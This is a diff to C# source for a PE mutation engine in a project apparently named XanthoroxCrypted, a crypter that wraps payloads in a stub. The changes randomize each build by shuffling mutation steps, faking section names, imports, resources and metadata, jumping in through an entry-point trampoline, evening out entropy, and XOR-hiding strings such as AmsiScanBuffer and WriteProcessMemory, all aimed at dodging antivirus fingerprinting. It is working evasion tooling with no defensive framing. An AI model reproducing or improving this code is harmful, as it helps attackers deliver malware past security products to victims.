@@ -16,43 +16,179 @@ namespace XanthoroxCrypted.Core
     /// PE Mutation Engine — makes every build structurally unique.
     /// Randomizes timestamps, strips Rich header, renames sections,
     /// and injects junk code into padding.
+    /// Build Randomization: per-build seed controls pipeline order,
+    /// junk layer count, section name style, and entry point jitter.
     /// </summary>
     public static class PEMutator
     {
-        private static readonly Random _rng = new Random();
+        private static Random _rng = new Random();
+
+        // ═══ Mutation pipeline with dependency groups ═══
+        // Group 0: Header cleanup (order independent within group)
+        // Group 1: Rich header (StripRichHeader must precede CloneRichHeader)
+        // Group 2: Timestamp override (RandomizeTimestamp precedes RealisticTimestamp)
+        // Group 3: Section mutations (order independent within group)
+        // Group 4: Resource/camouflage injection (order independent within group)
+        // Group 5: Entropy/strings (EqualizeEntropy precedes EncryptStringTable)
+        // Group 6: Always last — RepairChecksum
+
+        private class MutationStep
+        {
+            public string Name;
+            public int Group;
+            public string[] MustPrecede; // Names that must run before this step
+            public Action<byte[], System.Collections.Generic.List<(int, int)>, Random> Action;
+        }
+
+        private static MutationStep[] BuildPipeline()
+        {
+            return new MutationStep[]
+            {
+                // Group 0: Header cleanup
+                new() { Name="RandomizeTimestamp", Group=0, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => RandomizeTimestamp(pe) },
+                new() { Name="StripRichHeader", Group=0, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => StripRichHeader(pe) },
+                new() { Name="NullifyChecksum", Group=0, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => NullifyChecksum(pe) },
+                new() { Name="StripDebugDirectory", Group=0, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => StripDebugDirectory(pe) },
+
+                // Group 1: Rich header (CloneRichHeader depends on StripRichHeader)
+                new() { Name="CloneRichHeader", Group=1, MustPrecede=new[]{"StripRichHeader"},
+                    Action=(pe,ex,rng) => CloneRichHeader(pe) },
+
+                // Group 2: Timestamp override (RealisticTimestamp depends on RandomizeTimestamp)
+                new() { Name="RealisticTimestamp", Group=2, MustPrecede=new[]{"RandomizeTimestamp"},
+                    Action=(pe,ex,rng) => RealisticTimestamp(pe) },
+
+                // Group 3: Section mutations
+                new() { Name="RandomizeSectionNames", Group=3, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => RandomizeSectionNames(pe) },
+                new() { Name="InjectJunkCode", Group=3, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectJunkCode(pe) },
+                new() { Name="RandomizeEntryPoint", Group=3, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => RandomizeEntryPoint(pe) },
+
+                // Group 4: Resource/camouflage injection
+                new() { Name="AddIATCamouflage", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => AddIATCamouflage(pe) },
+                new() { Name="InjectVersionInfo", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectVersionInfo(pe) },
+                new() { Name="InjectIconResource", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectIconResource(pe) },
+                new() { Name="InjectResourceMimicry", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectResourceMimicry(pe) },
+                new() { Name="InjectSemanticDeadCode", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectSemanticDeadCode(pe) },
+                new() { Name="InjectExceptionHandlers", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => InjectExceptionHandlers(pe) },
+                new() { Name="CloneMetadata", Group=4, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => CloneMetadata(pe) },
+
+                // Group 5: Entropy/strings (EncryptStringTable depends on EqualizeEntropy)
+                new() { Name="EqualizeEntropy", Group=5, MustPrecede=new[]{"RandomizeSectionNames"},
+                    Action=(pe,ex,rng) => EqualizeEntropy(pe, ex) },
+                new() { Name="EncryptStringTable", Group=5, MustPrecede=new[]{"EqualizeEntropy"},
+                    Action=(pe,ex,rng) => EncryptStringTable(pe) },
+
+                // Group 6: Always last
+                new() { Name="RepairChecksum", Group=6, MustPrecede=Array.Empty<string>(),
+                    Action=(pe,ex,rng) => RepairChecksum(pe) },
+            };
+        }
+
+        /// <summary>
+        /// Shuffle steps within each group while respecting MustPrecede constraints.
+        /// Uses topological-aware Fisher-Yates: shuffle, then fix dependency violations.
+        /// </summary>
+        private static void ShuffleGroup(MutationStep[] steps, int groupStart, int groupEnd, Random rng)
+        {
+            if (groupEnd - groupStart <= 1) return;
+
+            // Fisher-Yates shuffle within the group range
+            for (int i = groupEnd - 1; i > groupStart; i--)
+            {
+                int j = rng.Next(groupStart, i + 1);
+                (steps[i], steps[j]) = (steps[j], steps[i]);
+            }
+
+            // Fix dependency violations: bubble MustPrecede items before dependents
+            bool changed = true;
+            while (changed)
+            {
+                changed = false;
+                for (int i = groupStart; i < groupEnd; i++)
+                {
+                    foreach (var dep in steps[i].MustPrecede)
+                    {
+                        for (int j = i + 1; j < groupEnd; j++)
+                        {
+                            if (steps[j].Name == dep)
+                            {
+                                // Dependency is after the dependent — swap
+                                (steps[i], steps[j]) = (steps[j], steps[i]);
+                                changed = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+        }
 
         public static void Mutate(byte[] peData)
         {
-            Mutate(peData, null);
+            Mutate(peData, null, null);
         }
 
         public static void Mutate(byte[] peData, System.Collections.Generic.List<(int start, int end)> dataExclusions)
         {
-            // ═══ Original 6 mutations ═══
-            RandomizeTimestamp(peData);
-            StripRichHeader(peData);
-            NullifyChecksum(peData);
-            RandomizeSectionNames(peData);
-            StripDebugDirectory(peData);
-            InjectJunkCode(peData);
+            Mutate(peData, dataExclusions, null);
+        }
 
-            // ═══ L17-L20 mutations ═══
-            RealisticTimestamp(peData);       // L18: Plausible 2023-2024 date
-            CloneRichHeader(peData);         // L19: Insert cloned Rich header
-            AddIATCamouflage(peData);        // L17: Fake imports
+        /// <param name="buildSeed">When non-null, enables Build Randomization:
+        /// randomized pipeline order, junk layer count, section name style,
+        /// entry point jitter. Each seed produces a different but valid build.</param>
+        public static void Mutate(byte[] peData, System.Collections.Generic.List<(int start, int end)> dataExclusions, int? buildSeed)
+        {
+            if (buildSeed.HasValue)
+                _rng = new Random(buildSeed.Value);
+            else
+                _rng = new Random();
 
-            // ═══ L24-L29, L32-L40 mutations ═══
-            InjectVersionInfo(peData);       // L24: Version info resource
-            InjectIconResource(peData);      // L25: Legitimate icon
-            InjectResourceMimicry(peData);   // L34: Fake dialogs/menus/strings
-            InjectSemanticDeadCode(peData);  // L36: Realistic dead code paths
-            InjectExceptionHandlers(peData); // L40: Fake SEH/UNWIND_INFO
-            CloneMetadata(peData);           // L37: Load Config from notepad
-            EqualizeEntropy(peData, dataExclusions);  // L38: Section entropy normalization
-            EncryptStringTable(peData);      // L29: XOR remaining strings
+            var pipeline = BuildPipeline();
 
-            // ═══ ALWAYS LAST: Repair PE Checksum ═══
-            RepairChecksum(peData);          // L26: Valid checksum
+            if (buildSeed.HasValue)
+            {
+                // Shuffle within each dependency group
+                int groupStart = 0;
+                int currentGroup = pipeline[0].Group;
+                for (int i = 1; i <= pipeline.Length; i++)
+                {
+                    if (i == pipeline.Length || pipeline[i].Group != currentGroup)
+                    {
+                        ShuffleGroup(pipeline, groupStart, i, _rng);
+                        if (i < pipeline.Length)
+                        {
+                            groupStart = i;
+                            currentGroup = pipeline[i].Group;
+                        }
+                    }
+                }
+            }
+
+            // Execute pipeline
+            foreach (var step in pipeline)
+                step.Action(peData, dataExclusions, _rng);
+
+            // Build Randomization: extra junk code passes (1-3 additional)
+            if (buildSeed.HasValue)
+            {
+                int extraPasses = _rng.Next(1, 4);
+                for (int i = 0; i < extraPasses; i++)
+                    InjectJunkCode(peData);
+            }
         }
 
         /// <summary>
@@ -113,17 +249,174 @@ namespace XanthoroxCrypted.Core
             int optHeaderSize = BitConverter.ToUInt16(pe, peOffset + 20);
             int sectionStart = peOffset + 24 + optHeaderSize;
 
-            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+            // Section name styles — Build Randomization picks one per build
+            string[][] nameStyles = {
+                // Style 0: .abc123 (original)
+                new[]{ "abcdefghijklmnopqrstuvwxyz0123456789" },
+                // Style 1: .UPX-like (.UPX0, .UPX1, .rsrc)
+                new[]{ "UPX0", "UPX1", "UPX2", "rsrc" },
+                // Style 2: MSVC-like (.text, .rdata, .data, .rsrc, .reloc)
+                new[]{ "text", "rdata", "data", "rsrc", "reloc", "idata" },
+                // Style 3: MinGW-like (.text, .data, .bss, .rdata)
+                new[]{ "text", "data", "bss", "rdata", "eh_fram" },
+            };
+
+            int styleIdx = _rng.Next(nameStyles.Length);
+            string[] stylePool = nameStyles[styleIdx];
 
             for (int i = 0; i < numSections; i++)
             {
-                int nameOffset = sectionStart + (i * 40); // Each section header is 40 bytes
+                int nameOffset = sectionStart + (i * 40);
                 if (nameOffset + 8 > pe.Length) break;
 
-                // Generate random 7-char name with leading dot
-                pe[nameOffset] = (byte)'.';
-                for (int j = 1; j < 8; j++)
-                    pe[nameOffset + j] = (byte)chars[_rng.Next(chars.Length)];
+                // Zero the 8-byte name field first
+                for (int j = 0; j < 8; j++) pe[nameOffset + j] = 0;
+
+                if (styleIdx == 0)
+                {
+                    pe[nameOffset] = (byte)'.';
+                    for (int j = 1; j < 8; j++)
+                        pe[nameOffset + j] = (byte)stylePool[0][_rng.Next(stylePool[0].Length)];
+                }
+                else
+                {
+                    // Pick from pool, wrap around if more sections than names
+                    string name = "." + stylePool[i % stylePool.Length];
+                    byte[] nameBytes = System.Text.Encoding.ASCII.GetBytes(name);
+                    for (int j = 0; j < Math.Min(nameBytes.Length, 8); j++)
+                        pe[nameOffset + j] = nameBytes[j];
+                }
+            }
+        }
+
+        /// <summary>
+        /// L42: Entry Point Jitter — add a small trampoline before the real entry point.
+        /// Moves AddressOfEntryPoint to a junk padding region, which JMPs back.
+        /// Makes static entry-point fingerprinting harder.
+        /// </summary>
+        private static void RandomizeEntryPoint(byte[] pe)
+        {
+            int peOffset = BitConverter.ToInt32(pe, 0x3C);
+            bool is64 = BitConverter.ToUInt16(pe, peOffset + 24) == 0x020B;
+            int optHeaderSize = BitConverter.ToUInt16(pe, peOffset + 20);
+            int numSections = BitConverter.ToUInt16(pe, peOffset + 6);
+            int sectionStart = peOffset + 24 + optHeaderSize;
+
+            // AddressOfEntryPoint offset in OptionalHeader
+            int epOffset = peOffset + 24 + 16;
+            if (epOffset + 4 > pe.Length) return;
+            uint origEP = BitConverter.ToUInt32(pe, epOffset);
+            if (origEP == 0) return;
+
+            // Find the .text section (executable, contains original EP)
+            for (int s = 0; s < numSections; s++)
+            {
+                int secHdr = sectionStart + (s * 40);
+                if (secHdr + 40 > pe.Length) break;
+
+                uint chars = BitConverter.ToUInt32(pe, secHdr + 36);
+                if ((chars & 0x20000000) == 0) continue;
+
+                uint secRVA = BitConverter.ToUInt32(pe, secHdr + 12);
+                uint secVSize = BitConverter.ToUInt32(pe, secHdr + 8);
+                uint secRawOff = BitConverter.ToUInt32(pe, secHdr + 20);
+                uint secRawSz = BitConverter.ToUInt32(pe, secHdr + 16);
+
+                if (origEP < secRVA || origEP >= secRVA + secVSize) continue;
+
+                // Trampoline must be within VirtualSize — only those bytes
+                // are loaded from disk by the OS PE loader. Bytes beyond
+                // VirtualSize in the section's raw data are zero-filled in
+                // memory, so writing code there would produce 0x00 at runtime.
+
+                // Find INT3/NOP padding BEFORE VirtualSize boundary (real code gap)
+                int epFileOff = (int)(secRawOff + (origEP - secRVA));
+                int codeEnd = (int)(secRawOff + secVSize);
+
+                // Look for a gap of INT3/NOP at least 16 bytes, starting
+                // from just before the original entry point (compiler often
+                // places hotpatch padding there: MOV EDI,EDI + INT3s)
+                int trampolineRawOff = -1;
+
+                // Strategy 1: Search backward from EP for hotpatch-style padding
+                int searchStart = Math.Max((int)secRawOff, epFileOff - 64);
+                int searchEnd = epFileOff;
+                int clearRun = 0;
+                for (int i = searchEnd - 1; i >= searchStart; i--)
+                {
+                    if (pe[i] == 0xCC || pe[i] == 0x90 || pe[i] == 0x00)
+                        clearRun++;
+                    else
+                        clearRun = 0;
+                }
+                // Check forward from the start of the clear run
+                clearRun = 0;
+                for (int i = searchStart; i < searchEnd; i++)
+                {
+                    if (pe[i] == 0xCC || pe[i] == 0x90 || pe[i] == 0x00)
+                    {
+                        clearRun++;
+                        if (clearRun >= 16 && trampolineRawOff < 0)
+                            trampolineRawOff = i - clearRun + 1;
+                    }
+                    else
+                    {
+                        clearRun = 0;
+                    }
+                }
+
+                // Strategy 2: Search forward from EP for INT3 padding after code
+                if (trampolineRawOff < 0)
+                {
+                    clearRun = 0;
+                    for (int i = epFileOff; i < codeEnd; i++)
+                    {
+                        if (pe[i] == 0xCC || pe[i] == 0x90)
+                        {
+                            clearRun++;
+                            if (clearRun >= 16 && trampolineRawOff < 0)
+                                trampolineRawOff = i - clearRun + 1;
+                        }
+                        else
+                        {
+                            clearRun = 0;
+                        }
+                    }
+                }
+
+                if (trampolineRawOff < 0) break; // No room for trampoline
+
+                // Verify trampoline is within VirtualSize (loaded from disk)
+                uint trampolineOff = (uint)trampolineRawOff;
+                if (trampolineOff < secRawOff || trampolineOff >= secRawOff + secVSize) break;
+
+                uint trampolineRVA = secRVA + (uint)(trampolineRawOff - secRawOff);
+
+                // JMP rel32 to original entry point
+                int relOffset = (int)(origEP - (trampolineRVA + 5));
+
+                // Write junk prolog (2-5 PUSH/POP pairs)
+                int pos = trampolineRawOff;
+                int junkLen = _rng.Next(2, 6);
+                for (int j = 0; j < junkLen && pos + 5 < trampolineRawOff + 16; j++)
+                {
+                    int reg = _rng.Next(8);
+                    pe[pos++] = (byte)(0x50 + reg);
+                    pe[pos++] = (byte)(0x58 + reg);
+                }
+
+                // JMP rel32
+                pe[pos++] = 0xE9;
+                pe[pos++] = (byte)(relOffset & 0xFF);
+                pe[pos++] = (byte)((relOffset >> 8) & 0xFF);
+                pe[pos++] = (byte)((relOffset >> 16) & 0xFF);
+                pe[pos++] = (byte)((relOffset >> 24) & 0xFF);
+
+                // Update AddressOfEntryPoint to trampoline
+                byte[] epBytes = BitConverter.GetBytes(trampolineRVA);
+                Array.Copy(epBytes, 0, pe, epOffset, 4);
+
+                break;
             }
         }
 
@@ -806,37 +1099,73 @@ namespace XanthoroxCrypted.Core
             uint existing = BitConverter.ToUInt32(pe, loadCfgDD);
             if (existing != 0) return;
 
-            // Minimal IMAGE_LOAD_CONFIG_DIRECTORY64 (first 112 bytes)
-            // Size field + SecurityCookie + GuardCFCheckFunctionPointer
-            byte[] loadCfg = new byte[112];
-            BitConverter.GetBytes((uint)112).CopyTo(loadCfg, 0); // Size
+            // Find a section with enough writable padding for LoadConfig data.
+            // Must be within a mapped section so the OS loader can find it.
+            int peOffsetLocal = peOffset;
+            int numSections = BitConverter.ToUInt16(pe, peOffsetLocal + 6);
+            int optHeaderSize = BitConverter.ToUInt16(pe, peOffsetLocal + 20);
+            int sectionStart = peOffsetLocal + 24 + optHeaderSize;
 
-            // TimeDateStamp — match our PE timestamp
+            uint targetRawOff = 0;
+            uint targetRVA = 0;
+            uint targetRawSz = 0;
+            uint targetVirtSz = 0;
+            const int loadCfgSize = 112;
+
+            for (int s = 0; s < numSections; s++)
+            {
+                int secHdr = sectionStart + (s * 40);
+                if (secHdr + 40 > pe.Length) break;
+                uint chars = BitConverter.ToUInt32(pe, secHdr + 36);
+                // Must be writable, readable, non-discardable, non-executable
+                if ((chars & 0x80000000) == 0) continue; // Writable
+                if ((chars & 0x40000000) == 0) continue; // Readable
+                if ((chars & 0x02000000) != 0) continue; // Skip discardable
+                if ((chars & 0x20000000) != 0) continue; // Skip executable
+
+                uint rva = BitConverter.ToUInt32(pe, secHdr + 12);
+                uint vsz = BitConverter.ToUInt32(pe, secHdr + 8);
+                uint raw = BitConverter.ToUInt32(pe, secHdr + 20);
+                uint rsz = BitConverter.ToUInt32(pe, secHdr + 16);
+
+                // Use padding zone (between VirtualSize and RawSize) if available
+                if (rsz > vsz && (rsz - vsz) >= loadCfgSize)
+                {
+                    targetRawOff = raw + vsz;
+                    targetRVA = rva + vsz;
+                    targetRawSz = rsz;
+                    targetVirtSz = vsz;
+                    break;
+                }
+            }
+
+            if (targetRawOff == 0) return; // No suitable section found
+
+            // Minimal IMAGE_LOAD_CONFIG_DIRECTORY64
+            byte[] loadCfg = new byte[loadCfgSize];
+            BitConverter.GetBytes((uint)loadCfgSize).CopyTo(loadCfg, 0); // Size
+
             int tsOff = peOffset + 8;
-            Array.Copy(pe, tsOff, loadCfg, 4, 4);
+            Array.Copy(pe, tsOff, loadCfg, 4, 4); // TimeDateStamp
 
-            // Major/MinorVersion matching Windows 10
             loadCfg[8] = 10; loadCfg[9] = 0;  // MajorVersion
             loadCfg[10] = 0; loadCfg[11] = 0; // MinorVersion
 
-            // GlobalFlagsClear and GlobalFlagsSet = 0 (normal)
-            // CriticalSectionDefaultTimeout
-            BitConverter.GetBytes((uint)0x00002710).CopyTo(loadCfg, 16); // 10000ms
+            BitConverter.GetBytes((uint)0x00002710).CopyTo(loadCfg, 16); // CriticalSectionDefaultTimeout
+            BitConverter.GetBytes((uint)0x00000001).CopyTo(loadCfg, is64 ? 48 : 28); // ProcessHeapFlags
 
-            // ProcessHeapFlags
-            BitConverter.GetBytes((uint)0x00000001).CopyTo(loadCfg, is64 ? 48 : 28);
-
-            // Write to a padding location and update DataDirectory
-            int padStart = pe.Length - 1024;
-            if (padStart < 0) return;
-
+            // Verify the padding area is clear
             bool clear = true;
-            for (int i = padStart; i < padStart + loadCfg.Length && clear; i++)
+            for (int i = (int)targetRawOff; i < (int)targetRawOff + loadCfgSize && clear; i++)
                 if (pe[i] != 0) clear = false;
-
             if (!clear) return;
 
-            Array.Copy(loadCfg, 0, pe, padStart, loadCfg.Length);
+            // Write LoadConfig data to section padding
+            Array.Copy(loadCfg, 0, pe, (int)targetRawOff, loadCfgSize);
+
+            // Update DataDirectory[10] to point to the LoadConfig
+            WriteU32(pe, loadCfgDD, targetRVA);
+            WriteU32(pe, loadCfgDD + 4, (uint)loadCfgSize);
         }
 
         // ═══════════════════════════════════════════════
@@ -859,6 +1188,7 @@ namespace XanthoroxCrypted.Core
 
                 uint rawOff = BitConverter.ToUInt32(pe, secHdr + 20);
                 uint rawSz = BitConverter.ToUInt32(pe, secHdr + 16);
+                uint virtSz = BitConverter.ToUInt32(pe, secHdr + 8);
                 uint chars = BitConverter.ToUInt32(pe, secHdr + 36);
 
                 if (rawSz == 0 || rawOff + rawSz > pe.Length) continue;
@@ -866,18 +1196,25 @@ namespace XanthoroxCrypted.Core
                 // Only equalize writable data sections (not .text)
                 if ((chars & 0x20000000) != 0) continue; // Skip executable
                 if ((chars & 0x40000000) == 0) continue; // Must be readable
+                if ((chars & 0x02000000) != 0) continue; // Skip discardable (.reloc etc.)
 
-                // Calculate current entropy
+                // CRITICAL: Only modify padding zone (between VirtualSize and RawSize).
+                // All bytes within VirtualSize are real data — modifying them corrupts
+                // relocation targets, global variables, and config structures.
+                uint paddingStart = rawOff + Math.Min(virtSz, rawSz);
+                uint paddingEnd = rawOff + rawSz;
+                if (paddingStart >= paddingEnd) continue;
+
+                // Calculate current entropy in padding zone only
                 int[] freq = new int[256];
-                for (uint i = rawOff; i < rawOff + rawSz; i++)
+                for (uint i = paddingStart; i < paddingEnd; i++)
                     freq[pe[i]]++;
 
-                // Find bytes with zero frequency and inject them into null padding
                 int nullCount = freq[0];
-                if (nullCount < 32) continue;
+                if (nullCount < 16) continue;
 
                 int injectCount = 0;
-                for (uint i = rawOff; i < rawOff + rawSz && injectCount < nullCount / 4; i++)
+                for (uint i = paddingStart; i < paddingEnd && injectCount < nullCount / 4; i++)
                 {
                     if (pe[i] == 0)
                     {
@@ -896,20 +1233,15 @@ namespace XanthoroxCrypted.Core
                             if (inExclusion) continue;
                         }
 
-                        // Check if this might be part of a null terminator
-                        bool isTerminator = (i + 1 < rawOff + rawSz && pe[i + 1] == 0);
-                        if (!isTerminator)
+                        for (int b = 1; b < 256; b++)
                         {
-                            for (int b = 1; b < 256; b++)
+                            if (freq[b] < (paddingEnd - paddingStart) / 512)
                             {
-                                if (freq[b] < rawSz / 512)
-                                {
-                                    pe[i] = (byte)b;
-                                    freq[b]++;
-                                    freq[0]--;
-                                    injectCount++;
-                                    break;
-                                }
+                                pe[i] = (byte)b;
+                                freq[b]++;
+                                freq[0]--;
+                                injectCount++;
+                                break;
                             }
                         }
                     }
@@ -928,7 +1260,8 @@ namespace XanthoroxCrypted.Core
                 "VirtualAlloc", "VirtualProtect", "CreateThread",
                 "WriteProcessMemory", "NtAllocateVirtualMemory",
                 "AmsiScanBuffer", "EtwEventWrite",
-                ".xthrx", "XCONFIG", "XPAYLOAD", "XKEY00"
+                ".xthrx", "XCONFIG", "XPAYLOAD", "XKEY00",
+                "Xanthorox", "Xanthorox-OFCrypt"
             };
 
             byte xorKey = (byte)(_rng.Next(1, 255));
@@ -952,7 +1285,9 @@ namespace XanthoroxCrypted.Core
                         // Don't encrypt sentinel markers we need for patching
                         // Check if this is in the .xthrx section (our config area)
                         // Skip it — those need to be findable by the builder
-                        if (pattern == "XCONFIG" || pattern == "XPAYLOAD" || pattern == "XKEY00")
+                        // Also skip integrity-check strings the stub reads at startup
+                        if (pattern == "XCONFIG" || pattern == "XPAYLOAD" || pattern == "XKEY00"
+                            || pattern == "Xanthorox" || pattern == "Xanthorox-OFCrypt")
                             continue;
 
                         // XOR encrypt in-place
